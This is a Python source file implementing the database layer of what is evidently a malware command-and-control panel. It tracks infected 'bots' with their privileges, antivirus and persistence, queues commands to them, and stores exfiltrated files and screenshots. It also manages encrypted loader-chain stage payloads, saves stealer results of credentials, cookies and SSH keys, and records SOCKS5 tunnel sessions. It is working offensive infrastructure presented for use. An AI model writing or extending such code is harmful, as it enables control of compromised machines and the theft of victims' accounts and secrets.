"""Database storage layer with schema migrations and connection pooling."""

import asyncio
import hashlib
import json
import logging
import sqlite3
import time
import uuid
from pathlib import Path

import aiosqlite

logger = logging.getLogger(__name__)

DB_PATH = Path(__file__).parent.parent.parent / "panel.db"
DATA_DIR = Path(__file__).parent.parent.parent / "data"
CURRENT_SCHEMA_VERSION = 5

_db_lock = asyncio.Lock()
_db_conn: aiosqlite.Connection | None = None


async def get_db() -> aiosqlite.Connection:
    """Get or create the database connection."""
    global _db_conn
    if _db_conn is None:
        _db_conn = await aiosqlite.connect(DB_PATH)
        _db_conn.row_factory = sqlite3.Row
        await _db_conn.execute("PRAGMA journal_mode=WAL")
        await _db_conn.execute("PRAGMA foreign_keys=ON")
        await _db_conn.execute("PRAGMA synchronous=NORMAL")
    return _db_conn


async def close_db():
    """Close the database connection."""
    global _db_conn
    if _db_conn:
        await _db_conn.close()
        _db_conn = None


MIGRATIONS = {
    1: {
        "description": "Initial schema with operators, sessions, enhanced bots/commands",
        "up": [
            # Schema version tracking
            """CREATE TABLE IF NOT EXISTS schema_version (
                version INTEGER PRIMARY KEY,
                applied_at INTEGER NOT NULL,
                description TEXT
            )""",
            # Operators table
            """CREATE TABLE IF NOT EXISTS operators (
                id TEXT PRIMARY KEY,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                created_at INTEGER NOT NULL,
                last_login INTEGER,
                is_active INTEGER DEFAULT 1
            )""",
            # Sessions table
            """CREATE TABLE IF NOT EXISTS sessions (
                token TEXT PRIMARY KEY,
                operator_id TEXT NOT NULL,
                created_at INTEGER NOT NULL,
                expires_at INTEGER NOT NULL,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (operator_id) REFERENCES operators(id) ON DELETE CASCADE
            )""",
            "CREATE INDEX IF NOT EXISTS idx_sessions_operator_id ON sessions(operator_id)",
            "CREATE INDEX IF NOT EXISTS idx_sessions_expires_at ON sessions(expires_at)",
            # Bots table (enhanced)
            """CREATE TABLE IF NOT EXISTS bots (
                hwid TEXT PRIMARY KEY,
                hostname TEXT,
                os TEXT,
                arch TEXT,
                username TEXT,
                privileges TEXT,
                av TEXT,
                exe_path TEXT,
                version TEXT,
                first_seen INTEGER,
                last_seen INTEGER,
                is_connected INTEGER DEFAULT 0,
                last_heartbeat INTEGER,
                client_ip TEXT,
                persistence TEXT
            )""",
            "CREATE INDEX IF NOT EXISTS idx_bots_is_connected ON bots(is_connected)",
            "CREATE INDEX IF NOT EXISTS idx_bots_last_seen ON bots(last_seen DESC)",
            # Commands table (enhanced)
            """CREATE TABLE IF NOT EXISTS commands (
                id TEXT PRIMARY KEY,
                bot_hwid TEXT NOT NULL,
                command_type TEXT NOT NULL,
                args TEXT,
                status TEXT DEFAULT 'pending',
                created_at INTEGER NOT NULL,
                dispatched_at INTEGER,
                completed_at INTEGER,
                operator_id TEXT,
                FOREIGN KEY (bot_hwid) REFERENCES bots(hwid),
                FOREIGN KEY (operator_id) REFERENCES operators(id)
            )""",
            "CREATE INDEX IF NOT EXISTS idx_commands_bot_hwid ON commands(bot_hwid)",
            "CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)",
            "CREATE INDEX IF NOT EXISTS idx_commands_created_at ON commands(created_at DESC)",
            # Responses table
            """CREATE TABLE IF NOT EXISTS responses (
                id TEXT PRIMARY KEY,
                command_id TEXT NOT NULL,
                status TEXT NOT NULL,
                data TEXT,
                received_at INTEGER NOT NULL,
                FOREIGN KEY (command_id) REFERENCES commands(id) ON DELETE CASCADE
            )""",
            "CREATE INDEX IF NOT EXISTS idx_responses_command_id ON responses(command_id)",
        ],
    },
    2: {
        "description": "Add downloads and screenshots tables",
        "up": [
            # Downloads table
            """CREATE TABLE IF NOT EXISTS downloads (
                id TEXT PRIMARY KEY,
                bot_hwid TEXT NOT NULL,
                command_id TEXT,
                remote_path TEXT,
                local_path TEXT NOT NULL,
                filename TEXT NOT NULL,
                size INTEGER NOT NULL,
                sha256 TEXT NOT NULL,
                received_at INTEGER NOT NULL,
                FOREIGN KEY (bot_hwid) REFERENCES bots(hwid),
                FOREIGN KEY (command_id) REFERENCES commands(id)
            )""",
            "CREATE INDEX IF NOT EXISTS idx_downloads_bot_hwid ON downloads(bot_hwid)",
            "CREATE INDEX IF NOT EXISTS idx_downloads_received_at ON downloads(received_at DESC)",
            # Screenshots table
            """CREATE TABLE IF NOT EXISTS screenshots (
                id TEXT PRIMARY KEY,
                bot_hwid TEXT NOT NULL,
                command_id TEXT,
                local_path TEXT NOT NULL,
                thumbnail_path TEXT,
                format TEXT DEFAULT 'png',
                size INTEGER NOT NULL,
                width INTEGER,
                height INTEGER,
                received_at INTEGER NOT NULL,
                FOREIGN KEY (bot_hwid) REFERENCES bots(hwid),
                FOREIGN KEY (command_id) REFERENCES commands(id)
            )""",
            "CREATE INDEX IF NOT EXISTS idx_screenshots_bot_hwid ON screenshots(bot_hwid)",
            "CREATE INDEX IF NOT EXISTS idx_screenshots_received_at ON screenshots(received_at DESC)",
        ],
    },
    3: {
        "description": "Add staging tables for loader chain payloads",
        "up": [
            # Staging payloads table - stores encrypted stage binaries
            """CREATE TABLE IF NOT EXISTS staging_payloads (
                id TEXT PRIMARY KEY,
                stage_number INTEGER NOT NULL,
                name TEXT NOT NULL,
                description TEXT,
                encrypted_blob BLOB NOT NULL,
                encryption_key_hint TEXT,
                size INTEGER NOT NULL,
                sha256 TEXT NOT NULL,
                is_active INTEGER DEFAULT 1,
                created_at INTEGER NOT NULL,
                created_by TEXT,
                FOREIGN KEY (created_by) REFERENCES operators(id)
            )""",
            "CREATE INDEX IF NOT EXISTS idx_staging_payloads_stage ON staging_payloads(stage_number)",
            "CREATE INDEX IF NOT EXISTS idx_staging_payloads_active ON staging_payloads(is_active)",
            # Staging requests table - logs fetch attempts for detection
            """CREATE TABLE IF NOT EXISTS staging_requests (
                id TEXT PRIMARY KEY,
                payload_id TEXT NOT NULL,
                client_ip TEXT,
                user_agent TEXT,
                requested_at INTEGER NOT NULL,
                served INTEGER DEFAULT 1,
                FOREIGN KEY (payload_id) REFERENCES staging_payloads(id)
            )""",
            "CREATE INDEX IF NOT EXISTS idx_staging_requests_payload ON staging_requests(payload_id)",
            "CREATE INDEX IF NOT EXISTS idx_staging_requests_time ON staging_requests(requested_at DESC)",
        ],
    },
    4: {
        "description": "Make staging_payloads.stage_number nullable; add stealer_results table",
        "up": [
            # SQLite does not support ALTER COLUMN, so rebuild staging_payloads.
            # stage_number was INTEGER NOT NULL (migration 3); tool payloads need NULL.
            "PRAGMA foreign_keys=OFF",
            """CREATE TABLE staging_payloads_new (
                id TEXT PRIMARY KEY,
                stage_number INTEGER,
                name TEXT NOT NULL,
                description TEXT,
                encrypted_blob BLOB NOT NULL,
                encryption_key_hint TEXT,
                size INTEGER NOT NULL,
                sha256 TEXT NOT NULL,
                is_active INTEGER DEFAULT 1,
                created_at INTEGER NOT NULL,
                created_by TEXT,
                FOREIGN KEY (created_by) REFERENCES operators(id)
            )""",
            "INSERT INTO staging_payloads_new SELECT * FROM staging_payloads",
            "DROP TABLE staging_payloads",
            "ALTER TABLE staging_payloads_new RENAME TO staging_payloads",
            "CREATE INDEX IF NOT EXISTS idx_staging_payloads_stage ON staging_payloads(stage_number)",
            "CREATE INDEX IF NOT EXISTS idx_staging_payloads_active ON staging_payloads(is_active)",
            "PRAGMA foreign_keys=ON",
            # Now add stealer_results
            """CREATE TABLE IF NOT EXISTS stealer_results (
                id TEXT PRIMARY KEY,
                bot_hwid TEXT NOT NULL,
                command_id TEXT,
                credentials TEXT DEFAULT '[]',
                cookies TEXT DEFAULT '[]',
                ssh_keys TEXT DEFAULT '[]',
                errors TEXT DEFAULT '[]',
                collection_time_ms INTEGER,
                received_at INTEGER NOT NULL,
                FOREIGN KEY (bot_hwid) REFERENCES bots(hwid),
                FOREIGN KEY (command_id) REFERENCES commands(id)
            )""",
            "CREATE INDEX IF NOT EXISTS idx_stealer_results_bot ON stealer_results(bot_hwid)",
            "CREATE INDEX IF NOT EXISTS idx_stealer_results_time ON stealer_results(received_at DESC)",
        ],
    },
    5: {
        "description": "Add tunnel_sessions for SOCKS5 and portfwd tracking",
        "up": [
            """CREATE TABLE IF NOT EXISTS tunnel_sessions (
                id TEXT PRIMARY KEY,
                bot_hwid TEXT NOT NULL,
                tunnel_type TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                local_port INTEGER,
                remote_host TEXT,
                remote_port INTEGER,
                created_at INTEGER NOT NULL,
                closed_at INTEGER,
                FOREIGN KEY (bot_hwid) REFERENCES bots(hwid)
            )""",
            "CREATE INDEX IF NOT EXISTS idx_tunnel_sessions_bot_hwid ON tunnel_sessions(bot_hwid)",
            "CREATE INDEX IF NOT EXISTS idx_tunnel_sessions_status ON tunnel_sessions(status)",
        ],
    },
}


async def get_schema_version() -> int:
    """Get current schema version, 0 if not initialized."""
    db = await get_db()
    try:
        async with db.execute("SELECT MAX(version) FROM schema_version") as cursor:
            row = await cursor.fetchone()
            return row[0] if row and row[0] else 0
    except aiosqlite.OperationalError:
        return 0


async def run_migrations():
    """Run all pending migrations."""
    db = await get_db()
    current = await get_schema_version()

    for version in range(current + 1, CURRENT_SCHEMA_VERSION + 1):
        if version not in MIGRATIONS:
            continue
        migration = MIGRATIONS[version]
        logger.info(f"Applying migration {version}: {migration['description']}")

        # Separate pragma statements from DDL/DML statements.
        # PRAGMAs cannot run inside a transaction in SQLite.
        pragma_stmts = [s for s in migration["up"] if s.strip().upper().startswith("PRAGMA")]
        data_stmts = [s for s in migration["up"] if not s.strip().upper().startswith("PRAGMA")]

        # Run pragmas outside transaction
        for sql in pragma_stmts:
            await db.execute(sql)

        # Run DDL/DML atomically
        await db.execute("BEGIN")
        try:
            for sql in data_stmts:
                await db.execute(sql)
            await db.execute(
                "INSERT INTO schema_version (version, applied_at, description) VALUES (?, ?, ?)",
                (version, int(time.time()), migration["description"]),
            )
            await db.execute("COMMIT")
        except Exception:
            await db.execute("ROLLBACK")
            raise
        logger.info(f"Migration {version} applied")


async def init_db():
    """Initialize database with migrations."""
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    (DATA_DIR / "downloads").mkdir(exist_ok=True)
    (DATA_DIR / "screenshots").mkdir(exist_ok=True)
    await run_migrations()


# =============================================================================
# Operator functions
# =============================================================================


async def create_operator(username: str, password_hash: str) -> str:
    """Create a new operator and return the ID."""
    db = await get_db()
    op_id = str(uuid.uuid4())
    async with _db_lock:
        await db.execute(
            "INSERT INTO operators (id, username, password_hash, created_at) VALUES (?, ?, ?, ?)",
            (op_id, username, password_hash, int(time.time())),
        )
        await db.commit()
    return op_id


async def get_operator_by_username(username: str) -> dict | None:
    """Get operator by username."""
    db = await get_db()
    async with db.execute(
        "SELECT * FROM operators WHERE username = ? AND is_active = 1", (username,)
    ) as cursor:
        row = await cursor.fetchone()
        return dict(row) if row else None


async def update_operator_login(operator_id: str):
    """Update last login timestamp."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "UPDATE operators SET last_login = ? WHERE id = ?",
            (int(time.time()), operator_id),
        )
        await db.commit()


# =============================================================================
# Session functions
# =============================================================================


async def create_session(
    token: str, operator_id: str, expires_at: int, ip_address: str = None, user_agent: str = None
) -> None:
    """Create a new session."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "INSERT INTO sessions (token, operator_id, created_at, expires_at, ip_address, user_agent) "
            "VALUES (?, ?, ?, ?, ?, ?)",
            (token, operator_id, int(time.time()), expires_at, ip_address, user_agent),
        )
        await db.commit()


async def get_session(token: str) -> dict | None:
    """Get session by token, including operator info."""
    db = await get_db()
    async with db.execute(
        """SELECT s.*, o.username FROM sessions s
           JOIN operators o ON s.operator_id = o.id
           WHERE s.token = ? AND s.expires_at > ?""",
        (token, int(time.time())),
    ) as cursor:
        row = await cursor.fetchone()
        return dict(row) if row else None


async def delete_session(token: str):
    """Delete a session."""
    db = await get_db()
    async with _db_lock:
        await db.execute("DELETE FROM sessions WHERE token = ?", (token,))
        await db.commit()


async def cleanup_expired_sessions():
    """Delete expired sessions."""
    db = await get_db()
    async with _db_lock:
        await db.execute("DELETE FROM sessions WHERE expires_at < ?", (int(time.time()),))
        await db.commit()


# =============================================================================
# Bot functions
# =============================================================================


async def upsert_bot(info: dict, client_ip: str = None):
    """Insert or update a bot from checkin data."""
    now = int(time.time())
    db = await get_db()
    persistence = json.dumps(info.get("persistence", []))
    async with _db_lock:
        await db.execute(
            """INSERT INTO bots (hwid, hostname, os, arch, username, privileges, av,
                exe_path, version, first_seen, last_seen, is_connected, last_heartbeat, client_ip, persistence)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?)
            ON CONFLICT(hwid) DO UPDATE SET
                hostname=excluded.hostname, os=excluded.os, arch=excluded.arch,
                username=excluded.username, privileges=excluded.privileges,
                av=excluded.av, exe_path=excluded.exe_path, version=excluded.version,
                last_seen=excluded.last_seen, is_connected=1, last_heartbeat=excluded.last_heartbeat,
                client_ip=excluded.client_ip, persistence=excluded.persistence""",
            (
                info["hwid"],
                info["hostname"],
                info["os"],
                info["arch"],
                info["username"],
                info["privileges"],
                json.dumps(info.get("av", [])),
                info.get("exe_path", ""),
                info.get("version", ""),
                now,
                now,
                now,
                client_ip,
                persistence,
            ),
        )
        await db.commit()


async def update_bot_heartbeat(hwid: str):
    """Update bot heartbeat timestamp."""
    now = int(time.time())
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "UPDATE bots SET last_heartbeat = ?, last_seen = ? WHERE hwid = ?",
            (now, now, hwid),
        )
        await db.commit()


async def set_bot_disconnected(hwid: str):
    """Mark bot as disconnected."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "UPDATE bots SET is_connected = 0, last_seen = ? WHERE hwid = ?",
            (int(time.time()), hwid),
        )
        await db.commit()


async def get_bot(hwid: str) -> dict | None:
    """Get a single bot by HWID."""
    db = await get_db()
    async with db.execute("SELECT * FROM bots WHERE hwid = ?", (hwid,)) as cursor:
        row = await cursor.fetchone()
        if row:
            bot = dict(row)
            bot["av"] = json.loads(bot["av"]) if bot["av"] else []
            bot["persistence"] = json.loads(bot["persistence"]) if bot["persistence"] else []
            return bot
        return None


async def list_bots() -> list[dict]:
    """List all bots ordered by last seen."""
    db = await get_db()
    async with db.execute("SELECT * FROM bots ORDER BY last_seen DESC") as cursor:
        bots = []
        async for row in cursor:
            bot = dict(row)
            bot["av"] = json.loads(bot["av"]) if bot["av"] else []
            bot["persistence"] = json.loads(bot["persistence"]) if bot["persistence"] else []
            bots.append(bot)
        return bots


# =============================================================================
# Command functions
# =============================================================================


async def save_command(
    cmd_id: str,
    bot_hwid: str,
    command_type: str,
    args: str,
    operator_id: str = None,
    status: str = "pending",
) -> None:
    """Save a new command."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "INSERT INTO commands (id, bot_hwid, command_type, args, status, created_at, operator_id) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (cmd_id, bot_hwid, command_type, args, status, int(time.time()), operator_id),
        )
        await db.commit()


async def get_command(cmd_id: str) -> dict | None:
    """Get a command by ID."""
    db = await get_db()
    async with db.execute("SELECT * FROM commands WHERE id = ?", (cmd_id,)) as cursor:
        row = await cursor.fetchone()
        return dict(row) if row else None


async def get_pending_commands(bot_hwid: str) -> list[dict]:
    """Get pending commands for a bot."""
    db = await get_db()
    async with db.execute(
        "SELECT * FROM commands WHERE bot_hwid = ? AND status = 'pending' ORDER BY created_at",
        (bot_hwid,),
    ) as cursor:
        return [dict(row) async for row in cursor]


async def mark_command_dispatched(cmd_id: str):
    """Mark a command as dispatched."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "UPDATE commands SET status = 'dispatched', dispatched_at = ? WHERE id = ?",
            (int(time.time()), cmd_id),
        )
        await db.commit()


async def mark_command_completed(cmd_id: str, success: bool = True):
    """Mark a command as completed or failed."""
    db = await get_db()
    status = "completed" if success else "failed"
    async with _db_lock:
        await db.execute(
            "UPDATE commands SET status = ?, completed_at = ? WHERE id = ?",
            (status, int(time.time()), cmd_id),
        )
        await db.commit()


async def list_commands(bot_hwid: str = None, limit: int = 100) -> list[dict]:
    """List commands, optionally filtered by bot."""
    db = await get_db()
    if bot_hwid:
        query = "SELECT * FROM commands WHERE bot_hwid = ? ORDER BY created_at DESC LIMIT ?"
        params = (bot_hwid, limit)
    else:
        query = "SELECT * FROM commands ORDER BY created_at DESC LIMIT ?"
        params = (limit,)
    async with db.execute(query, params) as cursor:
        return [dict(row) async for row in cursor]


async def list_commands_with_responses(bot_hwid: str = None, limit: int = 100) -> list[dict]:
    """List commands with their responses joined."""
    db = await get_db()
    if bot_hwid:
        query = """
            SELECT c.*, r.status as response_status, r.data as response_data, r.received_at as response_received_at
            FROM commands c
            LEFT JOIN responses r ON r.command_id = c.id
            WHERE c.bot_hwid = ?
            ORDER BY c.created_at DESC LIMIT ?
        """
        params = (bot_hwid, limit)
    else:
        query = """
            SELECT c.*, r.status as response_status, r.data as response_data, r.received_at as response_received_at
            FROM commands c
            LEFT JOIN responses r ON r.command_id = c.id
            ORDER BY c.created_at DESC LIMIT ?
        """
        params = (limit,)
    async with db.execute(query, params) as cursor:
        return [dict(row) async for row in cursor]


# =============================================================================
# Response functions
# =============================================================================


async def save_response(resp_id: str, command_id: str, status: str, data: str):
    """Save a command response."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "INSERT INTO responses (id, command_id, status, data, received_at) VALUES (?, ?, ?, ?, ?)",
            (resp_id, command_id, status, data, int(time.time())),
        )
        await db.commit()


# =============================================================================
# Download functions
# =============================================================================


async def save_download(
    download_id: str,
    bot_hwid: str,
    command_id: str,
    remote_path: str,
    local_path: str,
    filename: str,
    size: int,
    sha256: str,
) -> None:
    """Save a download record."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            """INSERT INTO downloads (id, bot_hwid, command_id, remote_path, local_path, filename, size, sha256, received_at)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (download_id, bot_hwid, command_id, remote_path, local_path, filename, size, sha256, int(time.time())),
        )
        await db.commit()


async def list_downloads(bot_hwid: str = None, limit: int = 100) -> list[dict]:
    """List downloads, optionally filtered by bot."""
    db = await get_db()
    if bot_hwid:
        query = "SELECT * FROM downloads WHERE bot_hwid = ? ORDER BY received_at DESC LIMIT ?"
        params = (bot_hwid, limit)
    else:
        query = "SELECT * FROM downloads ORDER BY received_at DESC LIMIT ?"
        params = (limit,)
    async with db.execute(query, params) as cursor:
        return [dict(row) async for row in cursor]


async def get_download(download_id: str) -> dict | None:
    """Get a download by ID."""
    db = await get_db()
    async with db.execute("SELECT * FROM downloads WHERE id = ?", (download_id,)) as cursor:
        row = await cursor.fetchone()
        return dict(row) if row else None


# =============================================================================
# Screenshot functions
# =============================================================================


async def save_screenshot(
    screenshot_id: str,
    bot_hwid: str,
    command_id: str,
    local_path: str,
    thumbnail_path: str,
    fmt: str,
    size: int,
    width: int = None,
    height: int = None,
) -> None:
    """Save a screenshot record."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            """INSERT INTO screenshots (id, bot_hwid, command_id, local_path, thumbnail_path, format, size, width, height, received_at)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (screenshot_id, bot_hwid, command_id, local_path, thumbnail_path, fmt, size, width, height, int(time.time())),
        )
        await db.commit()


async def list_screenshots(bot_hwid: str = None, limit: int = 100) -> list[dict]:
    """List screenshots, optionally filtered by bot."""
    db = await get_db()
    if bot_hwid:
        query = "SELECT * FROM screenshots WHERE bot_hwid = ? ORDER BY received_at DESC LIMIT ?"
        params = (bot_hwid, limit)
    else:
        query = "SELECT * FROM screenshots ORDER BY received_at DESC LIMIT ?"
        params = (limit,)
    async with db.execute(query, params) as cursor:
        return [dict(row) async for row in cursor]


async def get_screenshot(screenshot_id: str) -> dict | None:
    """Get a screenshot by ID."""
    db = await get_db()
    async with db.execute("SELECT * FROM screenshots WHERE id = ?", (screenshot_id,)) as cursor:
        row = await cursor.fetchone()
        return dict(row) if row else None


# =============================================================================
# Staging payload functions
# =============================================================================


async def save_staging_payload(
    payload_id: str,
    stage_number: int | None,
    name: str,
    encrypted_blob: bytes,
    size: int,
    sha256: str,
    description: str = None,
    encryption_key_hint: str = None,
    created_by: str = None,
) -> None:
    """Save a staging payload."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            """INSERT INTO staging_payloads
               (id, stage_number, name, description, encrypted_blob, encryption_key_hint, size, sha256, is_active, created_at, created_by)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?)""",
            (payload_id, stage_number, name, description, encrypted_blob, encryption_key_hint, size, sha256, int(time.time()), created_by),
        )
        await db.commit()


async def get_active_staging_payload(stage_number: int) -> dict | None:
    """Get the active payload for a stage number."""
    db = await get_db()
    async with db.execute(
        "SELECT * FROM staging_payloads WHERE stage_number = ? AND is_active = 1 ORDER BY created_at DESC LIMIT 1",
        (stage_number,),
    ) as cursor:
        row = await cursor.fetchone()
        return dict(row) if row else None


async def get_staging_payload(payload_id: str) -> dict | None:
    """Get a staging payload by ID."""
    db = await get_db()
    async with db.execute("SELECT * FROM staging_payloads WHERE id = ?", (payload_id,)) as cursor:
        row = await cursor.fetchone()
        return dict(row) if row else None


async def list_staging_payloads(stage_number: int = None) -> list[dict]:
    """List staging payloads, optionally filtered by stage."""
    db = await get_db()
    if stage_number is not None:
        query = "SELECT id, stage_number, name, description, encryption_key_hint, size, sha256, is_active, created_at, created_by FROM staging_payloads WHERE stage_number = ? ORDER BY created_at DESC"
        params = (stage_number,)
    else:
        query = "SELECT id, stage_number, name, description, encryption_key_hint, size, sha256, is_active, created_at, created_by FROM staging_payloads ORDER BY stage_number, created_at DESC"
        params = ()
    async with db.execute(query, params) as cursor:
        return [dict(row) async for row in cursor]


async def deactivate_staging_payload(payload_id: str) -> None:
    """Deactivate a staging payload."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "UPDATE staging_payloads SET is_active = 0 WHERE id = ?",
            (payload_id,),
        )
        await db.commit()


async def log_staging_request(
    request_id: str,
    payload_id: str,
    client_ip: str = None,
    user_agent: str = None,
    served: bool = True,
) -> None:
    """Log a staging payload fetch request."""
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "INSERT INTO staging_requests (id, payload_id, client_ip, user_agent, requested_at, served) VALUES (?, ?, ?, ?, ?, ?)",
            (request_id, payload_id, client_ip, user_agent, int(time.time()), 1 if served else 0),
        )
        await db.commit()


async def list_staging_requests(payload_id: str = None, limit: int = 100) -> list[dict]:
    """List staging requests, optionally filtered by payload."""
    db = await get_db()
    if payload_id:
        query = "SELECT * FROM staging_requests WHERE payload_id = ? ORDER BY requested_at DESC LIMIT ?"
        params = (payload_id, limit)
    else:
        query = "SELECT * FROM staging_requests ORDER BY requested_at DESC LIMIT ?"
        params = (limit,)
    async with db.execute(query, params) as cursor:
        return [dict(row) async for row in cursor]


# =============================================================================
# Stealer result functions
# =============================================================================


async def save_stealer_result(
    result_id: str,
    bot_hwid: str,
    command_id: str | None,
    credentials: list,
    cookies: list,
    ssh_keys: list,
    errors: list,
    collection_time_ms: int | None,
) -> None:
    db = await get_db()
    async with _db_lock:
        await db.execute(
            "INSERT INTO stealer_results "
            "(id, bot_hwid, command_id, credentials, cookies, ssh_keys, errors, collection_time_ms, received_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
            (result_id, bot_hwid, command_id,
             json.dumps(credentials), json.dumps(cookies),
             json.dumps(ssh_keys), json.dumps(errors),
             collection_time_ms, int(time.time())),
        )
        await db.commit()


async def list_stealer_results_for_bot(bot_hwid: str) -> list[dict]:
    db = await get_db()
    async with db.execute(
        "SELECT * FROM stealer_results WHERE bot_hwid = ? ORDER BY received_at DESC",
        (bot_hwid,),
    ) as cursor:
        return [dict(row) async for row in cursor]


async def list_all_stealer_results(limit: int = 100) -> list[dict]:
    db = await get_db()
    async with db.execute(
        "SELECT * FROM stealer_results ORDER BY received_at DESC LIMIT ?", (limit,),
    ) as cursor:
        return [dict(row) async for row in cursor]


async def list_active_staging_payloads(stage_number=...) -> list[dict]:
    """
    List active staging payloads.
    Ellipsis (default) = all active payloads.
    None = tool payloads (stage_number IS NULL).
    int = payloads for that stage number.
    """
    db = await get_db()
    if stage_number is ...:
        async with db.execute(
            "SELECT * FROM staging_payloads WHERE is_active = 1 ORDER BY created_at DESC"
        ) as cursor:
            return [dict(row) async for row in cursor]
    elif stage_number is None:
        async with db.execute(
            "SELECT * FROM staging_payloads WHERE is_active = 1 AND stage_number IS NULL ORDER BY created_at DESC"
        ) as cursor:
            return [dict(row) async for row in cursor]
    else:
        async with db.execute(
            "SELECT * FROM staging_payloads WHERE is_active = 1 AND stage_number = ? ORDER BY created_at DESC",
            (stage_number,),
        ) as cursor:
            return [dict(row) async for row in cursor]


# =============================================================================
# Tunnel session functions
# =============================================================================


async def create_tunnel_session(
    session_id: str, bot_hwid: str, tunnel_type: str,
    local_port: int | None = None, remote_host: str | None = None,
    remote_port: int | None = None,
) -> None:
    db = await get_db()
    await db.execute(
        """INSERT INTO tunnel_sessions
           (id, bot_hwid, tunnel_type, status, local_port, remote_host, remote_port, created_at)
           VALUES (?, ?, ?, 'pending', ?, ?, ?, ?)""",
        (session_id, bot_hwid, tunnel_type, local_port, remote_host, remote_port, int(time.time())),
    )
    await db.commit()


async def set_tunnel_session_active(session_id: str, local_port: int) -> None:
    db = await get_db()
    await db.execute(
        "UPDATE tunnel_sessions SET status='active', local_port=? WHERE id=?",
        (local_port, session_id),
    )
    await db.commit()


async def set_tunnel_session_closed(session_id: str) -> None:
    db = await get_db()
    await db.execute(
        "UPDATE tunnel_sessions SET status='closed', closed_at=? WHERE id=?",
        (int(time.time()), session_id),
    )
    await db.commit()


async def get_tunnel_sessions(bot_hwid: str) -> list[dict]:
    db = await get_db()
    async with db.execute(
        "SELECT * FROM tunnel_sessions WHERE bot_hwid=? ORDER BY created_at DESC", (bot_hwid,)
    ) as cursor:
        return [dict(row) for row in await cursor.fetchall()]
